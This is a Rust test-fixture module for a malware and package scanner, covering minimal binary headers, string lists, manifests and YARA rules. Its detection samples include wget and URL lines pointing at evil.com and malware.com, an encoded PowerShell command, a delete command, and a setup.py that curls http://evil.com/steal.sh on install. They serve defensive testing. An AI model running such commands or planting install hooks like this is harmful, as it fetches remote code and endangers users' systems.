#![allow(
    clippy::case_sensitive_file_extension_comparisons,
    clippy::cast_possible_truncation,
    clippy::cast_possible_wrap,
    clippy::cast_precision_loss,
    clippy::cast_sign_loss,
    clippy::collection_is_never_read,
    clippy::field_reassign_with_default,
    clippy::format_push_string,
    clippy::float_cmp,
    clippy::if_not_else,
    clippy::ignore_without_reason,
    clippy::items_after_statements,
    clippy::iter_on_single_items,
    clippy::large_futures,
    clippy::large_stack_arrays,
    clippy::large_stack_frames,
    clippy::manual_assert_eq,
    clippy::manual_let_else,
    clippy::match_same_arms,
    clippy::match_wildcard_for_single_variants,
    clippy::needless_collect,
    clippy::needless_pass_by_ref_mut,
    clippy::needless_pass_by_value,
    clippy::no_effect_underscore_binding,
    clippy::option_if_let_else,
    clippy::ref_option,
    clippy::redundant_clone,
    clippy::redundant_pattern_matching,
    clippy::self_only_used_in_recursion,
    clippy::significant_drop_tightening,
    clippy::single_match_else,
    clippy::single_option_map,
    clippy::too_many_lines,
    clippy::trivially_copy_pass_by_ref,
    clippy::unnecessary_debug_formatting,
    clippy::unreadable_literal,
    clippy::unused_async,
    clippy::unused_self,
    clippy::used_underscore_binding,
    clippy::useless_let_if_seq,
    clippy::wildcard_enum_match_arm,
    clippy::ignored_unit_patterns
)]

//! Common test fixtures for the file-scanner project

use std::fs;
use std::path::{Path, PathBuf};
use tempfile::TempDir;

/// Test binary data generators
pub mod binaries {

    /// Create a minimal ELF binary for testing
    pub fn create_elf_binary() -> Vec<u8> {
        vec![
            // ELF Header
            0x7f, 0x45, 0x4c, 0x46, // e_ident[EI_MAG0..EI_MAG3]
            0x02, // e_ident[EI_CLASS] = ELFCLASS64
            0x01, // e_ident[EI_DATA] = ELFDATA2LSB
            0x01, // e_ident[EI_VERSION] = EV_CURRENT
            0x00, // e_ident[EI_OSABI] = ELFOSABI_NONE
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // e_ident[EI_PAD]
            0x02, 0x00, // e_type = ET_EXEC
            0x3e, 0x00, // e_machine = EM_X86_64
            0x01, 0x00, 0x00, 0x00, // e_version = EV_CURRENT
            0x00, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // e_entry = 0x401000
            0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // e_phoff = 64
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // e_shoff = 0
            0x00, 0x00, 0x00, 0x00, // e_flags = 0
            0x40, 0x00, // e_ehsize = 64
            0x38, 0x00, // e_phentsize = 56
            0x01, 0x00, // e_phnum = 1
            0x40, 0x00, // e_shentsize = 64
            0x00, 0x00, // e_shnum = 0
            0x00, 0x00, // e_shstrndx = 0
        ]
    }

    /// Create a minimal PE binary for testing
    pub fn create_pe_binary() -> Vec<u8> {
        let mut data = vec![0; 1024];

        // DOS Header
        data[0] = 0x4d; // 'M'
        data[1] = 0x5a; // 'Z'
        data[60] = 0x80; // PE header offset

        // PE Signature at offset 0x80
        data[0x80] = 0x50; // 'P'
        data[0x81] = 0x45; // 'E'
        data[0x82] = 0x00;
        data[0x83] = 0x00;

        // COFF Header
        data[0x84] = 0x64; // Machine = IMAGE_FILE_MACHINE_AMD64
        data[0x85] = 0x86;

        data
    }

    /// Create a minimal Mach-O binary for testing
    pub fn create_macho_binary() -> Vec<u8> {
        vec![
            // Mach-O Header (64-bit)
            0xfe, 0xed, 0xfa, 0xcf, // magic = MH_MAGIC_64
            0x07, 0x00, 0x00, 0x01, // cputype = CPU_TYPE_X86_64
            0x03, 0x00, 0x00, 0x00, // cpusubtype = CPU_SUBTYPE_X86_64_ALL
            0x02, 0x00, 0x00, 0x00, // filetype = MH_EXECUTE
            0x01, 0x00, 0x00, 0x00, // ncmds = 1
            0x48, 0x00, 0x00, 0x00, // sizeofcmds = 72
            0x00, 0x20, 0x00, 0x00, // flags = MH_NOUNDEFS | MH_DYLDLINK
            0x00, 0x00, 0x00, 0x00, // reserved
        ]
    }

    /// Create a Java class file for testing
    pub fn create_java_class() -> Vec<u8> {
        vec![
            0xca, 0xfe, 0xba, 0xbe, // magic
            0x00, 0x00, // minor_version = 0
            0x00, 0x34, // major_version = 52 (Java 8)
            0x00, 0x0d, // constant_pool_count = 13
            // Minimal constant pool and class structure...
            0x01, 0x00, 0x04, 0x54, 0x65, 0x73, 0x74, // "Test"
        ]
    }

    /// Create a `WebAssembly` module for testing
    pub fn create_wasm_module() -> Vec<u8> {
        vec![
            0x00, 0x61, 0x73, 0x6d, // WASM magic
            0x01, 0x00, 0x00, 0x00, // version 1
        ]
    }
}

/// Test string data for string analysis
pub mod strings {
    /// Common benign strings
    pub fn benign_strings() -> Vec<&'static str> {
        vec![
            "Hello World",
            "example.com",
            "C:\\Program Files\\",
            "main",
            "/usr/bin/",
            "kernel32.dll",
            "libc.so.6",
        ]
    }

    /// Suspicious strings for testing detection
    pub fn suspicious_strings() -> Vec<&'static str> {
        vec![
            "http://malware.com/payload.exe",
            "powershell.exe -EncodedCommand",
            "CreateRemoteThread",
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "cmd.exe /c del",
            "eval(base64_decode(",
            "wget http://evil.com/backdoor",
        ]
    }

    /// High-entropy strings
    pub fn high_entropy_strings() -> Vec<&'static str> {
        vec![
            "k8Jq3nP9xRmZ7vT2",
            "A9B8C7D6E5F4G3H2",
            "X1Y2Z3A4B5C6D7E8",
            "9f8e7d6c5b4a3918",
        ]
    }

    /// Low-entropy strings
    pub fn low_entropy_strings() -> Vec<&'static str> {
        vec!["aaaaaaaaaa", "0000000000", "ABABABABAB", "1234567890"]
    }
}

/// Test package data for package security analysis
pub mod packages {
    /// Create an npm package.json with vulnerabilities
    pub const fn vulnerable_npm_package() -> &'static str {
        r#"{
            "name": "vulnerable-test-package",
            "version": "1.0.0",
            "description": "Test package with vulnerabilities",
            "dependencies": {
                "lodash": "4.0.0",
                "moment": "2.10.0",
                "express": "3.0.0"
            }
        }"#
    }

    /// Create a benign npm package.json
    pub const fn benign_npm_package() -> &'static str {
        r#"{
            "name": "benign-test-package",
            "version": "1.0.0",
            "description": "A safe test package",
            "dependencies": {
                "lodash": "^4.17.21",
                "express": "^4.18.2"
            }
        }"#
    }

    /// Create a Python setup.py with vulnerabilities
    pub const fn vulnerable_python_package() -> &'static str {
        r#"
from setuptools import setup

setup(
    name="vulnerable-python-package",
    version="1.0.0",
    description="Python package with vulnerabilities",
    install_requires=[
        "django==1.11.0",
        "flask==0.12.0",
        "requests==2.6.0"
    ]
)
"#
    }

    /// Create a malicious Python setup.py
    pub const fn malicious_python_package() -> &'static str {
        r#"
import subprocess
from setuptools import setup

# Malicious code
subprocess.run(['curl', '-s', 'http://evil.com/steal.sh'], shell=True)

setup(
    name="malicious-python-package",
    version="1.0.0",
    description="Package with malicious setup"
)
"#
    }
}

/// Test YARA rules for threat detection
pub mod yara_rules {
    /// Simple test rule
    pub const fn simple_test_rule() -> &'static str {
        r#"
rule test_rule {
    strings:
        $text = "Hello World"
    condition:
        $text
}
"#
    }

    /// Malware detection rule
    pub const fn malware_detection_rule() -> &'static str {
        r#"
rule detect_malware {
    strings:
        $api1 = "CreateRemoteThread"
        $api2 = "WriteProcessMemory"
        $api3 = "VirtualAllocEx"
        $url = "http://malware.com"
    condition:
        2 of ($api*) or $url
}
"#
    }

    /// PE header detection rule
    pub const fn pe_header_rule() -> &'static str {
        r#"
rule pe_file {
    strings:
        $mz = { 4D 5A }
        $pe = "PE"
    condition:
        $mz at 0 and $pe
}
"#
    }
}

/// Utility functions for creating test files
pub struct TestFileBuilder {
    temp_dir: TempDir,
}

impl Default for TestFileBuilder {
    fn default() -> Self {
        Self::new()
    }
}

impl TestFileBuilder {
    /// Create a new test file builder
    pub fn new() -> Self {
        Self {
            temp_dir: TempDir::new().unwrap(),
        }
    }

    /// Get the temporary directory path
    pub fn temp_dir(&self) -> &Path {
        self.temp_dir.path()
    }

    /// Create a test file with given content
    pub fn create_file(&self, name: &str, content: &[u8]) -> PathBuf {
        let file_path = self.temp_dir.path().join(name);
        fs::write(&file_path, content).unwrap();
        file_path
    }

    /// Create a test ELF binary
    pub fn create_elf_file(&self, name: &str) -> PathBuf {
        self.create_file(name, &binaries::create_elf_binary())
    }

    /// Create a test PE binary
    pub fn create_pe_file(&self, name: &str) -> PathBuf {
        self.create_file(name, &binaries::create_pe_binary())
    }

    /// Create a test text file with strings
    pub fn create_text_file(&self, name: &str, strings: &[&str]) -> PathBuf {
        let content = strings.join("\n");
        self.create_file(name, content.as_bytes())
    }

    /// Create an npm package directory
    pub fn create_npm_package(&self, package_json: &str) -> PathBuf {
        let package_dir = self.temp_dir.path().join("npm_package");
        fs::create_dir_all(&package_dir).unwrap();
        fs::write(package_dir.join("package.json"), package_json).unwrap();
        package_dir
    }

    /// Create a Python package directory
    pub fn create_python_package(&self, setup_py: &str) -> PathBuf {
        let package_dir = self.temp_dir.path().join("python_package");
        fs::create_dir_all(&package_dir).unwrap();
        fs::write(package_dir.join("setup.py"), setup_py).unwrap();
        package_dir
    }

    /// Create a directory with multiple test files
    pub fn create_test_directory(&self) -> PathBuf {
        let test_dir = self.temp_dir.path().join("test_files");
        fs::create_dir_all(&test_dir).unwrap();

        // Create various test files
        fs::write(test_dir.join("test.txt"), "Hello World").unwrap();
        fs::write(test_dir.join("binary.exe"), binaries::create_pe_binary()).unwrap();
        fs::write(test_dir.join("program"), binaries::create_elf_binary()).unwrap();
        fs::write(test_dir.join("data.bin"), [0x00, 0xFF, 0x55, 0xAA]).unwrap();

        test_dir
    }
}

/// Performance test utilities
pub mod performance {
    use std::time::{Duration, Instant};

    /// Measure the execution time of a function
    pub fn measure_time<F, R>(f: F) -> (R, Duration)
    where
        F: FnOnce() -> R,
    {
        let start = Instant::now();
        let result = f();
        let duration = start.elapsed();
        (result, duration)
    }

    /// Assert that an operation completes within a time limit
    pub fn assert_within_time<F, R>(f: F, max_duration: Duration, description: &str) -> R
    where
        F: FnOnce() -> R,
    {
        let (result, duration) = measure_time(f);
        assert!(
            duration <= max_duration,
            "{description} took {duration:?}, expected under {max_duration:?}"
        );
        result
    }

    /// Create test data of specified size
    pub fn create_test_data(size_bytes: usize) -> Vec<u8> {
        vec![0x55; size_bytes]
    }

    /// Create test data with pattern
    pub fn create_patterned_data(size_bytes: usize, pattern: &[u8]) -> Vec<u8> {
        let mut data = Vec::with_capacity(size_bytes);
        for i in 0..size_bytes {
            data.push(pattern[i % pattern.len()]);
        }
        data
    }
}

/// Common test assertions
pub mod assertions {
    use std::path::Path;

    /// Assert that a file exists and is readable
    pub fn assert_file_readable(path: &Path) {
        assert!(path.exists(), "File should exist: {path:?}");
        assert!(path.is_file(), "Path should be a file: {path:?}");

        let metadata = std::fs::metadata(path).unwrap();
        assert!(metadata.len() > 0, "File should not be empty: {path:?}");
    }

    /// Assert that a directory exists and is readable
    pub fn assert_directory_readable(path: &Path) {
        assert!(path.exists(), "Directory should exist: {path:?}");
        assert!(path.is_dir(), "Path should be a directory: {path:?}");
    }

    /// Assert that a value is within a range
    pub fn assert_within_range<T>(value: T, min: T, max: T, description: &str)
    where
        T: PartialOrd + std::fmt::Debug,
    {
        assert!(
            value >= min && value <= max,
            "{description} should be within range [{min:?}, {max:?}], got {value:?}"
        );
    }

    /// Assert that a collection is not empty
    pub fn assert_not_empty<T>(collection: &[T], description: &str) {
        assert!(!collection.is_empty(), "{description} should not be empty");
    }

    /// Assert that a string contains expected substrings
    pub fn assert_contains_all(text: &str, expected: &[&str], description: &str) {
        for expected_substring in expected {
            assert!(
                text.contains(expected_substring),
                "{description} should contain '{expected_substring}' but got: {text}"
            );
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_binary_generators() {
        let elf = binaries::create_elf_binary();
        assert!(elf.starts_with(&[0x7f, 0x45, 0x4c, 0x46])); // ELF magic

        let pe = binaries::create_pe_binary();
        assert!(pe.starts_with(&[0x4d, 0x5a])); // MZ magic

        let macho = binaries::create_macho_binary();
        assert!(macho.starts_with(&[0xfe, 0xed, 0xfa, 0xcf])); // Mach-O magic
    }

    #[test]
    fn test_string_collections() {
        assert!(!strings::benign_strings().is_empty());
        assert!(!strings::suspicious_strings().is_empty());
        assert!(!strings::high_entropy_strings().is_empty());
        assert!(!strings::low_entropy_strings().is_empty());
    }

    #[test]
    fn test_package_templates() {
        let npm_pkg = packages::vulnerable_npm_package();
        assert!(npm_pkg.contains("lodash"));
        assert!(npm_pkg.contains("4.0.0")); // Vulnerable version

        let py_pkg = packages::vulnerable_python_package();
        assert!(py_pkg.contains("django"));
        assert!(py_pkg.contains("1.11.0")); // Vulnerable version
    }

    #[test]
    fn test_file_builder() {
        let builder = TestFileBuilder::new();

        let text_file = builder.create_text_file("test.txt", &["Hello", "World"]);
        assertions::assert_file_readable(&text_file);

        let elf_file = builder.create_elf_file("test.elf");
        assertions::assert_file_readable(&elf_file);

        let test_dir = builder.create_test_directory();
        assertions::assert_directory_readable(&test_dir);
    }

    #[test]
    fn test_performance_utilities() {
        let (result, duration) = performance::measure_time(|| {
            std::thread::sleep(std::time::Duration::from_millis(10));
            42
        });

        assert_eq!(result, 42);
        assert!(duration >= std::time::Duration::from_millis(10));

        let data = performance::create_test_data(1000);
        assert_eq!(data.len(), 1000);
        assert!(data.iter().all(|&b| b == 0x55));
    }
}
